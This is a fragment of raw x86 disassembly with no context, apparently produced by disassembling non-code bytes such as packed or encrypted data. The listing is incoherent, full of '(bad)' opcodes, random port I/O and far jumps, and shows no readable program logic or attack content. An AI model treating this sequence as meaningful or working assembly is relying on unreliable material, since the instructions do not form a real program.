  4027a2:	jns    0x402783
  4027a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027a5:	ret    0xe00c
  4027a8:	ror    DWORD PTR [ebx+0x51],cl
  4027ab:	or     DWORD PTR [esp+edx*2-0x70],0xffffffb3
  4027b0:	sub    DWORD PTR [eax-0x3d9cf548],eax
  4027b6:	es das 
  4027b8:	cmp    eax,ebp
  4027ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027bb:	ror    cl,cl
  4027bd:	sbb    esp,DWORD PTR [esi-0x12]
  4027c0:	mov    ecx,0xf0f0b6f6
  4027c5:	xor    al,BYTE PTR [edx-0x9]
  4027c8:	mov    al,ds:0xfc616023
  4027cd:	push   ebx
  4027ce:	xchg   dl,ch
  4027d0:	mov    dh,0xdc
  4027d2:	jmp    0xb3b5ab19
  4027d7:	mov    ch,0x1a
  4027d9:	ins    BYTE PTR es:[edi],dx
  4027da:	inc    esp
  4027db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027dc:	mov    BYTE PTR [edi],bh
  4027de:	cmp    BYTE PTR [eax],dl
  4027e0:	psubusb mm1,QWORD PTR [eax]
  4027e3:	xchg   BYTE PTR [eax+0x4c80aff1],dh
  4027e9:	aaa    
  4027ea:	pop    ds
  4027eb:	add    eax,ecx
  4027ed:	pop    esi
  4027ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ef:	dec    ebx
  4027f0:	(bad)  
  4027f1:	sub    BYTE PTR [edx+0x2c],dl
  4027f4:	in     eax,0x58
  4027f6:	dec    edi
  4027f7:	stos   DWORD PTR es:[edi],eax
  4027f8:	pushf  
  4027f9:	(bad)  
  4027fa:	in     al,0x85
  4027fc:	xchg   ebx,eax
  4027fd:	dec    esi
  4027fe:	push   edi
  4027ff:	push   edx
  402800:	(bad)  
  402801:	xchg   esi,eax
  402802:	(bad)  
  402803:	xchg   ecx,eax
  402804:	sub    BYTE PTR [ebp+0x46d00861],bh
  40280a:	popa   
  40280b:	repz (bad) 
  40280d:	sahf   
  40280e:	xchg   edx,eax
  40280f:	xchg   ecx,eax
  402810:	xor    eax,0xd3d66858
  402815:	pop    es
  402816:	lods   eax,DWORD PTR ds:[esi]
  402817:	fsub   DWORD PTR [eax-0x6d]
  40281a:	test   BYTE PTR [eax],0x42
  40281d:	adc    BYTE PTR [ecx+0x60fc36eb],ch
  402823:	ja     0x4027ac
  402825:	stos   DWORD PTR es:[edi],eax
  402826:	stos   BYTE PTR es:[edi],al
  402827:	xchg   ecx,eax
  402828:	enter  0xd882,0x56
  40282c:	icebp  
  40282d:	ins    DWORD PTR es:[edi],dx
  40282e:	pusha  
  40282f:	stos   DWORD PTR es:[edi],eax
  402830:	jmp    0x2f34fd71
  402835:	fadd   QWORD PTR [edx-0x6e]
  402838:	inc    ebx
  402839:	jg     0x4028aa
  40283b:	stos   BYTE PTR es:[edi],al
  40283c:	iret   
  40283d:	inc    ecx
  40283e:	sub    cl,BYTE PTR [ecx+0x762a9a7a]
  402844:	lea    eax,[ebx+0x628f0b78]
  40284a:	int    0xea
  40284c:	(bad)  
  40284d:	mov    esp,DWORD PTR [ecx-0x39bedaf3]
  402853:	pop    ds
  402854:	add    BYTE PTR [ebx-0x3b],cl
  402857:	adc    ebp,DWORD PTR [ecx]
  402859:	jg     0x40287a
  40285b:	add    eax,0x1be8690e
  402860:	outs   dx,DWORD PTR ds:[esi]
  402861:	add    eax,0x1d47893c
  402866:	add    cl,BYTE PTR [ebp+0x4b7f50f7]
  40286c:	nop
  40286d:	mov    ebx,0xd4e484fb
  402872:	out    0xc,eax
  402874:	add    BYTE PTR [ebp+0x1f60b46],ah
  40287a:	xor    eax,0x3f748915
  40287f:	and    ebx,esi
  402881:	inc    esi
  402882:	enter  0x1708,0xe
  402886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402887:	clc    
  402888:	dec    esi
  402889:	es cmp eax,0xf99b6142
  40288f:	gs mov ch,0x69
  402892:	(bad)  
  402893:	loop   0x402833
  402895:	mov    ch,0xbd
  402897:	dec    edx
  402898:	dec    esp
  402899:	mov    bl,0x34
  40289b:	ins    BYTE PTR es:[edi],dx
  40289c:	out    dx,eax
  40289d:	fmul   DWORD PTR [eax]
  40289f:	fwait
  4028a0:	stos   DWORD PTR es:[edi],eax
  4028a1:	xor    al,0xf2
  4028a3:	test   edi,eax
  4028a5:	and    eax,0x826188dd
  4028aa:	rcl    dl,cl
  4028ac:	retf   0x87f9
  4028af:	mov    dh,0x8e
  4028b1:	dec    ebx
  4028b2:	pop    ebp
  4028b3:	jne    0x40290e
  4028b5:	scas   al,BYTE PTR es:[edi]
  4028b6:	ret    
  4028b7:	jp     0x40284a
  4028b9:	push   edi
  4028ba:	daa    
  4028bb:	imul   esp,DWORD PTR [ebx-0xd],0xffffffd7
  4028bf:	cs push 0x5d5fc20
  4028c5:	shl    DWORD PTR [edx],1
  4028c7:	push   ecx
  4028c8:	adc    al,0xaf
  4028ca:	pop    ebx
  4028cb:	and    eax,0x76c25d4d
  4028d0:	inc    ecx
  4028d1:	push   ss
  4028d2:	daa    
  4028d3:	inc    esi
  4028d4:	pop    esp
  4028d5:	scas   al,BYTE PTR es:[edi]
  4028d6:	push   cs
  4028d7:	or     eax,0xd997b216
  4028dc:	jbe    0x4028f6
  4028de:	mov    BYTE PTR [ebx+0x75],bh
  4028e1:	and    dh,BYTE PTR [ecx+ecx*1+0x7a]
  4028e5:	test   al,0xce
  4028e7:	bound  esi,QWORD PTR [ebx+0x7e]
  4028ea:	dec    eax
  4028eb:	imul   eax,DWORD PTR [edx-0x1a9aa40c],0xff1050bf
  4028f5:	lock mov DWORD PTR ds:[ecx],esi
  4028f9:	nop
  4028fa:	sbb    eax,0x3e1027de
  4028ff:	out    0x94,al
  402901:	std    
  402902:	or     BYTE PTR [esi+0x59],bl
  402905:	aas    
  402906:	clc    
  402907:	fwait
  402908:	jb     0x4028d8
  40290a:	pop    esp
  40290b:	xchg   ebp,eax
  40290c:	jmp    0x29ff12a1
  402911:	aas    
  402912:	sub    eax,DWORD PTR [ebx-0x44]
  402915:	je     0x40293d
  402917:	std    
  402918:	cmp    eax,0x3595658e
  40291d:	loope  0x4028f2
  40291f:	fdiv   DWORD PTR [edi+0x5bbd3fe4]
  402925:	mov    al,0x13
  402927:	lea    edx,[edx]
  402929:	pop    edi
  40292a:	call   DWORD PTR [ebx+ebp*8]
  40292d:	scas   al,BYTE PTR es:[edi]
  40292e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40292f:	fwait
  402930:	retf   0x8a6c
  402933:	mov    ebp,0x4ac64a91
  402938:	repnz std 
  40293a:	(bad)  
  40293b:	out    dx,eax
  40293c:	neg    DWORD PTR [eax]
  40293e:	jl     0x402964
  402940:	or     DWORD PTR [ecx],ebp
  402942:	movhps QWORD PTR [eax],xmm7
  402945:	inc    esi
  402946:	adc    dh,dl
  402948:	mov    BYTE PTR [ebx+0x40e6d6c4],cl
  40294e:	dec    ebp
  40294f:	or     eax,0xbede3919
  402954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402955:	push   0x6e
  402957:	ja     0x4029cd
  402959:	sbb    ecx,esi
  40295b:	sti    
  40295c:	mov    BYTE PTR [ebp-0x58b80561],dh
  402962:	adc    bl,BYTE PTR [edi]
  402964:	call   0x4240:0x4f1d6963
  40296b:	lds    esi,FWORD PTR es:[ebx+edx*1]
  40296f:	test   DWORD PTR [eax+eax*8+0x2],edx
  402973:	pop    esp
  402974:	inc    esi
  402975:	mov    ebx,0x2b38276d
  40297a:	cld    
  40297b:	cmc    
  40297c:	mov    ah,0x12
  40297e:	mov    edx,0x5d8066b7
  402983:	cmp    al,0x8
  402985:	sub    edi,eax
  402987:	cdq    
  402988:	dec    ebx
  402989:	popf   
  40298a:	or     DWORD PTR [esi-0x716828e6],0xcc850851
  402994:	pushf  
  402995:	push   ds
  402996:	xor    eax,DWORD PTR [ebx+0x1f3915e6]
  40299c:	jle    0x402967
  40299e:	xchg   esp,eax
  40299f:	fisttp QWORD PTR [esi+0x7c8f6f97]
  4029a5:	cmp    DWORD PTR [edx],ecx
  4029a7:	jle    0x4029d3
  4029a9:	mov    dh,0x88
  4029ab:	jns    0x4029b5
  4029ad:	stos   BYTE PTR es:[edi],al
  4029ae:	jo     0x402980
  4029b0:	jb     0x402a02
  4029b2:	imul   ebp,DWORD PTR [ebp-0x3eb219a0],0xffffffe2
  4029b9:	pop    eax
  4029ba:	shr    DWORD PTR [edi-0x5b0006af],0xb4
  4029c1:	dec    ecx
  4029c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029c3:	call   0x95e7732c
  4029c8:	aam    0x4f
  4029ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029cb:	ret    0x4b02
  4029ce:	pop    ebx
  4029cf:	(bad)  
  4029d0:	scas   al,BYTE PTR es:[edi]
  4029d1:	pop    eax
  4029d2:	stos   BYTE PTR es:[edi],al
  4029d3:	rol    BYTE PTR [ecx+esi*4],0x8b
  4029d7:	ss repz push es
  4029da:	jnp    0x402a0f
  4029dc:	aad    0x8e
  4029de:	retf   
  4029df:	xchg   esp,eax
  4029e0:	aam    0xaa
  4029e2:	or     DWORD PTR [edx+0x17c958cb],0x1976adf
  4029ec:	dec    esi
  4029ed:	and    bl,ch
  4029ef:	fcompp 
  4029f1:	dec    edx
  4029f2:	mov    ah,0x27
  4029f4:	cli    
  4029f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029f6:	cmp    DWORD PTR [esi+ecx*4+0x4],eax
  4029fa:	pop    edi
  4029fb:	sar    BYTE PTR [eax],1
  4029fd:	rol    BYTE PTR [ecx],cl
  4029ff:	mov    al,0x2a
  402a01:	mov    ch,0xe2
  402a03:	push   ds
  402a04:	retf   0xe62e
  402a07:	fisttp DWORD PTR [ecx]
  402a09:	xor    BYTE PTR [ecx],dh
  402a0b:	inc    edi
  402a0c:	fcomi  st,st(5)
  402a0e:	outs   dx,BYTE PTR ds:[esi]
  402a0f:	inc    ebx
  402a10:	aas    
  402a11:	or     BYTE PTR [ecx-0x7ac313b0],bl
  402a17:	push   esi
  402a18:	cmp    dh,BYTE PTR [esi]
  402a1a:	mov    bh,BYTE PTR [ebx-0x1e0586dd]
  402a20:	adc    BYTE PTR [edx+0x39d059c7],dh
  402a26:	popa   
  402a27:	icebp  
  402a28:	sub    DWORD PTR [eax-0x511c2a09],esp
  402a2e:	popa   
  402a2f:	js     0x402a9f
  402a31:	(bad)  
  402a32:	xor    DWORD PTR [ebx+0x4e1a5c50],eax
  402a38:	(bad)  
  402a39:	pushf  
  402a3a:	pop    es
  402a3b:	push   0xe15b0a49
  402a40:	mov    cl,dh
  402a42:	lds    eax,FWORD PTR [ecx-0x51]
  402a45:	and    ebx,DWORD PTR [esi+0x36]
  402a48:	daa    
  402a49:	adc    BYTE PTR [ecx+ecx*8-0xcf577a3],cl
  402a50:	jne    0x402ab2
  402a52:	mov    bh,0xc2
  402a54:	aad    0xd5
  402a56:	jnp    0x402a7d
  402a58:	xor    BYTE PTR ds:0xd05af192,0xc
  402a5f:	dec    esp
  402a60:	add    al,0x5b
  402a62:	pop    esi
  402a63:	xchg   edx,eax
  402a64:	(bad)  
  402a65:	sbb    ebp,DWORD PTR [eax+edx*2]
  402a68:	cmp    edi,DWORD PTR [ebx+0x4c793d9f]
  402a6e:	mov    edx,0xcabef67
  402a73:	add    eax,0x7883fbe3
  402a78:	mov    bh,0xc9
  402a7a:	mov    ch,0x79
  402a7c:	inc    ebp
  402a7d:	sub    BYTE PTR [edx-0x1d],0xe8
  402a81:	(bad)  
  402a83:	mov    eax,ds:0x4ef406e2
  402a88:	and    bl,ch
  402a8a:	cld    
  402a8b:	push   edi
  402a8c:	adc    al,0xce
  402a8e:	sub    BYTE PTR [ebp+eax*2+0x4a],ch
  402a92:	jb     0x402aa0
  402a94:	xchg   edx,eax
  402a95:	dec    ebp
  402a96:	out    dx,eax
  402a97:	xchg   DWORD PTR [esi-0x615b328],ebx
  402a9d:	ins    DWORD PTR es:[edi],dx
  402a9e:	ret    0x601d
  402aa1:	and    BYTE PTR [edx+0x79],0x4b
  402aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aa6:	pop    esi
  402aa7:	mov    ds:0x49a350cb,eax
  402aac:	pop    ebp
  402aad:	shl    BYTE PTR [esi],cl
  402aaf:	sbb    esp,ecx
  402ab1:	fadd   QWORD PTR [edi-0x58f3703b]
  402ab7:	int    0xf4
  402ab9:	sbb    al,0x86
  402abb:	xor    edi,0x68c515db
  402ac1:	ret    
  402ac2:	clc    
  402ac3:	jb     0x402b00
  402ac5:	clc    
  402ac6:	enter  0xa8b4,0x6c
  402aca:	dec    edx
  402acb:	cmp    al,0xe8
  402acd:	dec    ebx
  402ace:	sahf   
  402acf:	jno    0x402a71
  402ad1:	int3   
  402ad2:	pop    ss
  402ad3:	mov    esi,0x990b163c
  402ad8:	xchg   esi,eax
  402ad9:	stos   BYTE PTR es:[edi],al
  402ada:	xchg   esp,eax
  402adb:	ret    0x4b3b
  402ade:	imul   ecx,DWORD PTR [esi-0x6d],0xe0c06e7a
  402ae5:	inc    ebx
  402ae6:	push   ebx
  402ae7:	dec    edi
  402ae8:	mov    ah,0x98
  402aea:	ins    BYTE PTR es:[edi],dx
  402aeb:	pushf  
  402aec:	out    0x76,al
  402aee:	dec    ecx
  402aef:	sar    DWORD PTR [edx],1
  402af1:	xchg   BYTE PTR [eax+0xd],ah
  402af4:	int3   
  402af5:	call   0x7bafbea
  402afa:	mov    eax,0xe59dfc62
  402aff:	cmp    esi,DWORD PTR ds:0x381e8447
  402b05:	inc    edi
  402b06:	cli    
  402b07:	int    0xab
  402b09:	cmp    ch,BYTE PTR [ebp+0x458b4bf2]
  402b0f:	scas   eax,DWORD PTR es:[edi]
  402b10:	xor    BYTE PTR [ebp-0x25],bl
  402b13:	or     DWORD PTR [eax],ebx
  402b15:	sbb    al,0xd0
  402b17:	mov    ah,0x59
  402b19:	(bad)
  402b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b1e:	dec    ax
  402b20:	xor    edx,DWORD PTR [ebp-0x54a616ac]
  402b26:	std    
  402b27:	rcr    BYTE PTR [edi-0x1aa90697],0x9f
  402b2e:	out    0x82,eax
  402b30:	sub    eax,0x2ad10b29
  402b35:	pop    es
  402b36:	and    eax,0x73764edc
  402b3b:	sub    dl,BYTE PTR [esi]
  402b3d:	and    BYTE PTR [ebx-0x11],dh
  402b40:	test   ch,ch
  402b42:	sbb    esi,DWORD PTR [edx-0x7bd36827]
  402b48:	mov    ecx,0xf490ee0b
  402b4d:	out    0xac,al
  402b4f:	inc    edx
  402b50:	js     0x402b95
  402b52:	pusha  
  402b53:	outs   dx,BYTE PTR ds:[esi]
  402b54:	retf   
  402b55:	mov    eax,ds:0x32c6541c
  402b5a:	push   ebp
  402b5b:	test   cl,cl
  402b5d:	xchg   esp,eax
  402b5e:	sbb    BYTE PTR [edx],dh
  402b60:	xchg   edx,eax
  402b61:	xchg   edx,eax
  402b62:	push   ss
  402b63:	xor    al,0x94
  402b65:	(bad)
  402b69:	or     BYTE PTR [eax+0x3763f949],ah
  402b6f:	adc    BYTE PTR [eax*8-0x6ac90339],bl
  402b76:	std    
  402b77:	xchg   edx,eax
  402b78:	sbb    BYTE PTR [edx+0x70],bl
  402b7b:	pop    ecx
  402b7c:	mov    edx,0xf13f05fd
  402b81:	in     al,dx
  402b82:	loop   0x402b6b
  402b84:	into   
  402b85:	dec    BYTE PTR [ebx]
  402b87:	inc    edx
  402b88:	enter  0x38ae,0xac
  402b8c:	or     edx,eax
  402b8e:	sub    eax,0xc8d9dbcb
  402b93:	data16 stc 
  402b95:	or     edx,0x8c10fa84
  402b9b:	mov    bh,0x10
  402b9d:	fild   WORD PTR [ecx+0x3a]
  402ba0:	cs mov ecx,0x4a51758a
  402ba6:	mov    dl,BYTE PTR [ecx-0x74]
  402ba9:	sub    eax,0x962e6b38
  402bae:	(bad)  
  402baf:	icebp  
  402bb0:	dec    edi
  402bb1:	cs xchg ecx,eax
  402bb3:	test   DWORD PTR [edi-0x1cfdb291],ebp
  402bb9:	int    0x1a
  402bbb:	push   edi
  402bbc:	mov    esp,0xd7d45821
  402bc1:	lds    ebp,FWORD PTR [esi+0x43]
  402bc4:	pop    edi
  402bc5:	das    
  402bc6:	mov    dh,0xdc
  402bc8:	shl    BYTE PTR [edi+0x7dd60a7],0x62
  402bcf:	xor    ebp,ebx
  402bd1:	xor    DWORD PTR [ebp-0x21],0xc58efe8a
  402bd8:	jg     0x402b98
  402bda:	rcl    BYTE PTR [ebx+0x45],1
  402bdd:	dec    ecx
  402bde:	pushf  
  402bdf:	xor    BYTE PTR [edx-0x585d98bf],al
  402be5:	out    0xf5,eax
  402be7:	sub    al,BYTE PTR [edi+0x4a57059e]
  402bed:	sbb    BYTE PTR [ebx],cl
  402bef:	mov    ds:0xa12f2f02,al
  402bf4:	cmp    al,0xd2
  402bf6:	mov    ds:0x3a5e9a84,eax
  402bfb:	jns    0x402bd6
  402bfd:	fdivr  DWORD PTR [edi]
  402bff:	sahf   
  402c00:	repnz pop cx
  402c03:	fisubr WORD PTR [ebp-0x42bd27ed]
  402c09:	push   edx
  402c0a:	clc    
  402c0b:	aad    0xa
  402c0d:	je     0x402c16
  402c0f:	pushf  
  402c10:	adc    DWORD PTR [ebx-0x7c],0x6f1ff624
  402c17:	and    BYTE PTR [esi+0x40],al
  402c1a:	outs   dx,BYTE PTR ds:[esi]
  402c1b:	cld    
  402c1c:	fwait
  402c1d:	jle    0x402ba6
  402c1f:	nop
  402c20:	push   ebx
  402c21:	pop    esp
  402c22:	cs xchg ebx,eax
  402c24:	retf   0x499f
  402c27:	ins    DWORD PTR es:[edi],dx
  402c28:	mov    bl,BYTE PTR ds:0x4a17ff0c
  402c2e:	adc    bh,BYTE PTR [edi-0x32]
  402c31:	push   0xbc8418b5
  402c36:	fst    QWORD PTR [edx-0x80]
  402c39:	out    0x9b,al
  402c3b:	bnd jne 0x402c51
  402c3e:	test   DWORD PTR [eax-0x6abc7467],eax
  402c44:	hlt    
  402c45:	scas   eax,DWORD PTR es:[edi]
  402c46:	es (bad) 
  402c48:	rol    bh,cl
  402c4a:	popf   
  402c4b:	cs ins DWORD PTR es:[edi],dx
  402c4d:	xchg   BYTE PTR [ecx+0x4],al
  402c50:	xchg   ebp,eax
  402c51:	mov    al,0xe3
  402c53:	dec    esp
  402c54:	xor    cl,dl
  402c56:	dec    esp
  402c57:	xor    DWORD PTR [ecx+0x4c50bb59],ebx
  402c5d:	ret    0xc816
  402c60:	imul   edx,DWORD PTR [esp+eax*4],0xb1bcadaf
  402c67:	pop    DWORD PTR [ebp-0x4f]
  402c6a:	leave  
  402c6b:	mov    bh,0x67
  402c6d:	int3   
  402c6e:	scas   al,BYTE PTR es:[edi]
  402c6f:	rcl    DWORD PTR [ebp+0x2c],cl
  402c72:	pop    esi
  402c73:	rcr    DWORD PTR [eax],1
  402c75:	xor    cl,dh
  402c77:	jne    0x402c44
  402c79:	and    DWORD PTR ds:0x2a754dd4,edx
  402c7f:	adc    eax,0x63ddaca7
  402c84:	xchg   ecx,eax
  402c85:	ror    ebx,1
  402c87:	loop   0x402c0f
  402c89:	scas   al,BYTE PTR es:[edi]
  402c8a:	iret   
  402c8b:	or     dh,BYTE PTR ds:0x1d5b5bea
  402c91:	add    eax,0xb07db41d
  402c96:	in     al,dx
  402c97:	sub    eax,ebx
  402c99:	das    
  402c9a:	retf   0x531e
  402c9d:	imul   esp,DWORD PTR [esi+0x7e885f03],0x29f745e2
  402ca7:	loope  0x402cc5
  402ca9:	mov    ds:0x5b4c9c1d,al
  402cae:	jae    0x402cfd
  402cb0:	jne    0x402c39
  402cb2:	push   ss
  402cb3:	mov    ebp,0x1561e88
  402cb8:	jno    0x402c86
  402cba:	ds add al,0x6c
  402cbd:	mov    cl,0xbf
  402cbf:	rcl    edi,cl
  402cc1:	inc    esi
  402cc2:	scas   al,BYTE PTR es:[edi]
  402cc3:	push   esi
  402cc4:	push   eax
  402cc5:	cmc    
  402cc6:	outs   dx,BYTE PTR ds:[esi]
  402cc7:	sti    
  402cc8:	daa    
  402cc9:	lock adc eax,0xa14d5da5
  402ccf:	and    al,BYTE PTR [ebx+0x5c64128d]
  402cd5:	ds sub eax,0xf3fd4660
  402cdb:	push   ebp
  402cdd:	push   0x683c581f
  402ce2:	fild   WORD PTR gs:[ecx]
  402ce5:	sub    dl,BYTE PTR [esi+0x257171da]
  402ceb:	aam    0x49
  402ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cee:	xlat   BYTE PTR fs:[ebx]
  402cf0:	pop    ecx
  402cf1:	mov    dl,0x46
  402cf3:	arpl   WORD PTR [esi-0x7b358987],bp
  402cf9:	sub    BYTE PTR [edi-0x29],bh
  402cfc:	inc    esi
  402cfd:	inc    ebp
  402cfe:	jb     0x402d61
  402d00:	mov    edx,0x9d955a6c
  402d05:	inc    esi
  402d06:	pop    ds
  402d07:	shl    BYTE PTR [edx-0x72],0x8e
  402d0b:	fdivr  st(4),st
  402d0d:	push   edi
  402d0e:	adc    al,0xc1
  402d10:	shr    esp,1
  402d12:	daa    
  402d13:	xchg   edx,eax
  402d14:	ins    DWORD PTR es:[edi],dx
  402d15:	xchg   edi,eax
  402d16:	into   
  402d17:	stos   BYTE PTR es:[edi],al
  402d18:	push   esp
  402d19:	add    bl,al
  402d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1c:	in     al,dx
  402d1d:	sahf   
  402d1e:	in     eax,0x30
  402d20:	add    ecx,DWORD PTR [eax+0x5]
  402d23:	jo     0x402d87
  402d25:	lods   eax,DWORD PTR ds:[esi]
  402d26:	out    dx,al
  402d27:	jnp    0x402cf3
  402d29:	in     al,0x6
  402d2b:	sar    BYTE PTR [edi+0x5b388d0d],0x69
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	cmp    BYTE PTR [edi],dh
  402d35:	aas    
  402d36:	or     esi,edx
  402d38:	pop    esi
  402d39:	je     0x402d13
  402d3b:	inc    ecx
  402d3c:	(bad)  
  402d3d:	out    dx,al
  402d3e:	push   ecx
  402d3f:	xchg   ecx,eax
  402d40:	ret    0x4a13
  402d43:	stos   BYTE PTR es:[edi],al
  402d44:	hlt    
  402d45:	je     0x402d2e
  402d47:	iret   
  402d48:	jecxz  0x402cf4
  402d4a:	mov    al,0xdc
  402d4c:	mov    esi,0x19bef2d6
  402d51:	inc    ebx
  402d52:	retf   
  402d53:	mov    ebp,0x33debb7a
  402d58:	fcomi  st,st(7)
  402d5a:	ds in  al,dx
  402d5c:	cmp    DWORD PTR [eax-0x3aef668c],0x74
  402d63:	and    DWORD PTR [esi+0x3b5879b0],0x46f865c2
  402d6d:	mov    ebp,DWORD PTR [ecx+eiz*1+0x57]
  402d71:	inc    ebx
  402d72:	repnz fsub st(2),st
  402d75:	sti    
  402d76:	cli    
  402d77:	mov    bh,0xfb
  402d79:	iret   
  402d7a:	xor    eax,0xe981965c
  402d7f:	jae    0x402ddb
  402d81:	pushf  
  402d82:	sbb    al,0x50
  402d84:	jae    0x402d24
  402d86:	mov    al,0x91
  402d88:	mov    bh,0xd
  402d8a:	loope  0x402d1b
  402d8c:	loop   0x402d2a
  402d8e:	push   ss
  402d8f:	je     0x402d2a
  402d91:	fwait
  402d92:	mov    ds:0xec91c70b,eax
  402d97:	in     eax,0x8e
  402d99:	xchg   dh,al
  402d9b:	(bad)  
  402d9c:	mov    dl,0xf9
  402d9e:	mov    cl,BYTE PTR cs:[esi-0x6]
  402da2:	mov    dh,BYTE PTR [edx]
  402da4:	cmp    eax,0xe056f7b4
  402da9:	mov    esp,0xddbf5717
  402dae:	imul   ebp,DWORD PTR [eax+0x2685ead0],0x8ba9fd40
  402db8:	mov    ecx,0xab58b353
  402dbd:	or     edi,DWORD PTR [eax]
  402dbf:	xchg   edx,eax
  402dc0:	in     al,dx
  402dc1:	adc    dl,BYTE PTR [ebp+esi*4-0x6c]
  402dc5:	pop    esi
  402dc6:	in     al,dx
  402dc7:	loopne 0x402e30
  402dc9:	add    al,0x4b
  402dcb:	retf   
  402dcc:	cwde   
  402dcd:	in     al,dx
  402dce:	in     al,dx
  402dcf:	loop   0x402e37
  402dd1:	xchg   edx,eax
  402dd2:	mov    eax,ds:0x9b255d76
  402dd7:	and    DWORD PTR [ecx],esi
  402dd9:	mov    esp,edi
  402ddb:	repz inc edx
  402ddd:	cmp    ebp,DWORD PTR [edi]
  402ddf:	mov    edi,0x4c7a4948
  402de4:	hlt    
  402de5:	adc    eax,0xc025792b
  402dea:	mov    bl,0xf6
  402dec:	neg    eax
  402dee:	sub    ch,cl
  402df0:	pop    ebx
  402df1:	lods   eax,DWORD PTR ds:[esi]
  402df2:	push   esi
  402df3:	call   0xe5dd2355
  402df8:	mov    BYTE PTR [ebx+0x5e],bh
  402dfb:	ror    BYTE PTR [esi+0x34ec494e],1
  402e01:	cs fcmove st,st(2)
  402e04:	out    0xf2,eax
  402e06:	test   DWORD PTR [esi-0x70],0x1805a872
  402e0d:	xchg   edx,eax
  402e0e:	(bad)  
  402e0f:	loope  0x402e0e
  402e11:	sub    al,0x1c
  402e13:	mov    esp,DWORD PTR [ebx]
  402e15:	sbb    ebx,DWORD PTR [bp+0x49]
  402e19:	and    BYTE PTR [edx+edx*8+0x637aabdc],cl
  402e20:	adc    edx,DWORD PTR [edi-0x11cb8a7f]
  402e26:	inc    ebp
  402e27:	sar    DWORD PTR [edi],cl
  402e29:	sti    
  402e2a:	gs pop esp
  402e2c:	xchg   esi,eax
  402e2d:	cdq    
  402e2e:	sahf   
  402e2f:	sbb    eax,DWORD PTR [ebx]
  402e31:	imul   esp,eax,0x7e
  402e34:	inc    esp
  402e35:	adc    esi,ebp
  402e37:	push   ebp
  402e38:	cli    
  402e39:	pop    esi
  402e3a:	aas    
  402e3b:	and    al,0x24
  402e3d:	or     al,0x32
  402e3f:	mov    esp,0xbb61c7e0
  402e44:	scas   eax,DWORD PTR es:[di]
  402e46:	xchg   esp,eax
  402e47:	mov    ch,0x65
  402e49:	jl     0x402e64
  402e4b:	mov    cl,0x5c
  402e4d:	sbb    DWORD PTR [esi],ebx
  402e4f:	mov    dh,0x82
  402e51:	mov    ah,0xa9
  402e53:	test   BYTE PTR [ebp+0x1c],ah
  402e56:	icebp  
  402e57:	sti    
  402e58:	mov    bl,0xbf
  402e5a:	loop   0x402e65
  402e5c:	sub    al,0xec
  402e5e:	xor    al,bh
  402e60:	inc    edx
  402e61:	pop    ebp
  402e62:	in     al,0xb7
  402e64:	xchg   bl,dh
  402e66:	(bad)  
  402e67:	or     bl,BYTE PTR ds:0x770f4794
  402e6d:	dec    edi
  402e6e:	sahf   
  402e6f:	xchg   ebp,eax
  402e70:	arpl   WORD PTR [esi+0x57],di
  402e73:	lods   al,BYTE PTR ds:[esi]
  402e74:	es sbb ebx,ebx
  402e77:	mov    DWORD PTR [esi],0xe1f5015d
  402e7d:	push   esp
  402e7e:	inc    esp
  402e7f:	dec    ebx
  402e80:	mov    eax,ds:0x289e0438
  402e85:	scas   al,BYTE PTR es:[edi]
  402e86:	in     eax,dx
  402e87:	or     DWORD PTR [edi],esp
  402e89:	adc    bl,BYTE PTR [ebp+0x12]
  402e8c:	mov    esi,0x12abf029
  402e91:	(bad)  
  402e92:	sub    al,0x22
  402e94:	xchg   ebp,eax
  402e96:	jg     0x402e22
  402e98:	sub    ecx,DWORD PTR [esp+esi*2-0x3a]
  402e9c:	sbb    DWORD PTR [ebx-0xf86351],ecx
  402ea2:	aas    
  402ea3:	push   0x5cf7889d
  402ea8:	add    eax,0x55a6f561
  402ead:	jae    0x402e87
  402eaf:	hlt    
  402eb0:	jp     0x402eef
  402eb2:	dec    ecx
  402eb3:	adc    BYTE PTR [ebx-0x576cc6d6],bh
  402eb9:	jno    0x402f14
  402ebb:	popf   
  402ebc:	mov    dh,0xd3
  402ebe:	push   ecx
  402ebf:	(bad)  
  402ec0:	outs   dx,BYTE PTR ds:[esi]
  402ec1:	stos   DWORD PTR es:[edi],eax
  402ec2:	lods   eax,DWORD PTR ds:[esi]
  402ec3:	mov    esp,0x5f033428
  402ec8:	in     eax,dx
  402ec9:	xchg   esp,eax
  402eca:	xchg   esi,eax
  402ecb:	mov    eax,ds:0x17d94d42
  402ed0:	sbb    ch,BYTE PTR [ebp-0xf287323]
  402ed6:	and    bh,BYTE PTR [eax-0x2d]
  402ed9:	inc    eax
  402eda:	mov    eax,ds:0x9d59e96
  402edf:	ror    cl,1
  402ee1:	call   0xda35:0x29c99e9c
  402ee8:	fwait
  402ee9:	pop    ebp
  402eea:	xchg   edx,eax
  402eeb:	mov    ?,WORD PTR [eax-0x7eec2da4]
  402ef1:	inc    esi
  402ef2:	lock out dx,eax
  402ef4:	jb     0x402f75
  402ef6:	std    
  402ef7:	aad    0xcc
  402ef9:	in     eax,dx
  402efa:	jle    0x402f55
  402efc:	out    dx,al
  402efd:	pop    ecx
  402efe:	pop    es
  402eff:	into   
  402f00:	hlt    
  402f01:	loop   0x402edb
  402f03:	push   edx
  402f04:	loopne 0x402f00
  402f06:	pop    ss
  402f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f08:	fisttp WORD PTR [ebp+0x3381605a]
  402f0e:	(bad)  
  402f0f:	fsub   QWORD PTR ds:0xaf7c2ac3
  402f15:	adc    eax,0x3a2d20f
  402f1a:	jo     0x402f5d
  402f1c:	jp     0x402f2c
